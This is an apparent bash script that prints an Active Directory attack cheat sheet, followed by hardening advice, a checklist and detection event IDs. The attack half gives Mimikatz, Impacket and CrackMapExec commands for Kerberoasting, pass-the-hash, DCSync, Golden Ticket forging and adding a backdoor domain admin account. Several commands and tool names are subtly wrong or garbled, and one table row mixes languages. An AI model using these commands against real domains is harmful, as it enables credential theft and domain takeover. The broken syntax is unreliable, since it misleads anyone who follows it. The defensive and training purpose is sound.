#!/bin/bash
# Active Directory Security Assessment - Project 53

echo "
╔════════════════════════════════════════════════════════════════╗
║     Active Directory Security - Project 53                   ║
║                                                                ║
║     EDUCATIONAL USE ONLY                                       ║
║     Only test AD environments you own or have permission to test║
╚════════════════════════════════════════════════════════════════╝

ACTIVE DIRECTORY ATTACK VECTORS:

1. RECONNAISSANCE
   # Enum4Linux (SMB enumeration)
   enum4linux -a domaincontroller
   
   # BloodHound (relationship mapping)
   .\\\\BloodHound\\\\Collectors\\\\SharpHound.exe -c all
   
   # PowerView (domain enumeration)
   Import-Module .\\\\PowerView.ps1
   Get-NetDomain
   Get-NetUser
   Get-NetGroup

2. CREDENTIAL ATTACKS
   # Kerberoasting (request service tickets)
   requestservicequotaticket.py 'domain\\\\user@target.com'
   
   # AS-REP Roasting (no preauth users)
   Get-ASREPRoast -Domain domain.com
   
   # Password spraying
   crackmapexec passwordspray -u users.txt -p password123 dc.domain.com

3. LATERAL MOVEMENT
   # Pass-the-Hash
   wmiexec.py -hashes :<NTLM hash> user@target
   
   # Pass-the-Ticket
   sekurlsa::tickets
   kerberos::ptt @ticket.kirbi
   
   # Overpass-the-Hash
   sekurlsa::ekeys (get krbtgt hash)
   sekurlsa::pth /user:admin /rc4:<hash>

4. PRIVILEGE ESCALATION
   # DCSync (replicate domain data)
   lsadump::dcsync /domain:domain.com /user:krbtgt
   
   # Golden Ticket (forged TGT)
   kerberos::golden /user:admin /domain:domain.com /sid:<domain SID> /krbtgt:<hash> /ticket:admin.kirbi
   
   # Silver Ticket (forged service ticket)
   kerberos::silver /service:cifs/server /user:admin /rc4:<NTLM hash>

5. DOMAIN PERSISTENCE
   # Add Domain Admins
   net user hacker password123 /add /domain
   net group \"Domain Admins\" hacker /add /domain
   
   # Security descriptor manipulation
   # Grant yourself DCsync rights
   # Modify ACLs for hidden persistence

COMMON VULNERABILITIES:

| Issue | Risk | Fix |
|-------|------|-----|
| Weak password policy | Critical | Enforce complexity + lockout |
| SMBv1 enabled | High | Disable SMBv1 |
| LAPS not deployed | High | Deploy LAPS |
| Unconstrained delegation | High | Constrain delegation |
| SMB signing not required | Medium | Enable SMB signing |
| Kerberoasting users | Medium | Service accounts with strong passwords |
| Foreign domain trust | Medium | Review trust relationships |

BLOODHOUND QUERIES:

# Find shortest path to Domain Admin
MATCH p=shortestPath((u1:User)-[*1..]->(u2:User {highvalue:true}))
WHERE u1.name <> 'ANONYMOUS LOGON'
RETURN p

# Find users with SPN (Kerberoasting)
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalname

# Find all users with admin count
MATCH (u:User) WHERE u.admincount=true RETURN u.name

# Find constrained delegation
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name

TOOLS:

| Tool | Purpose |
|------|---------|
| BloodHound | AD relationship visualization |
| PowerView | AD enumeration (PowerShell) |
|Responder | LLMNR/NBT-NS poisoning |
| Impacket | Python攻击 toolkit |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| AD Explorer | AD browsing |

SECURING ACTIVE DIRECTORY:

1. PASSWORD POLICIES
   # Minimum 14 characters, complexity
   # Account lockout after 5 failed attempts
   # No password reuse (last 12)
   
2. PROTOCOL SECURITY
   # Disable NTLMv1
   # Enable LDAP signing
   # Enable SMB signing
   # Disable Kerberos rc4 encryption

3. MONITORING
   # Enable Secure WinRM logs
   # Monitor login failures
   # Alert on privilege group changes
   # Monitor for DCSync

4. GROUP POLICY
   # Restrict admin access
   # No local admin on workstations
   # Patch servers regularly
   # Deploy LAPS

5. DELEGATION
   # Use constrained delegation
   # Avoid unconstrained delegation
   # Remove generic all delegation

AD SECURITY CHECKLIST:

[ ] Password policy: 14+ chars, complexity, lockout
[ ] SMBv1 disabled
[ ] LLMNR disabled
[ ] NTLMv1 disabled
[ ] LDAP signing required
[ ] SMB signing required
[ ] LAPS deployed
[ ] Constrained delegation only
[ ] No unnecessary domain admin accounts
[ ] Regular security audits
[ ] Monitoring and alerting enabled
[ ] Quarterly penetration testing

DETECTING ATTACKS:

# Golden ticket (unusual lifetime)
# DCSync replication (unusual source)
# Kerberoasting (many SPN requests)
# Pass-the-hash (token from network logon)
# Unusual admin group changes

TO DETECT:

- Monitor 4769 (TGS request) for unusual users
- Monitor 4624 logon type 3 from workstations
- Monitor service account usage patterns
- Alert on 4732 (member added to security group)

"

# Check for tools
echo -e \"\\n[*] Checking AD security tools...\"
for tool in bloodhound crackmapexec nmap; do
    if command -v $tool &> /dev/null 2>&1; then
        echo \"[+] $tool installed\"
    else
        echo \"[-] $tool not found\"
    fi
done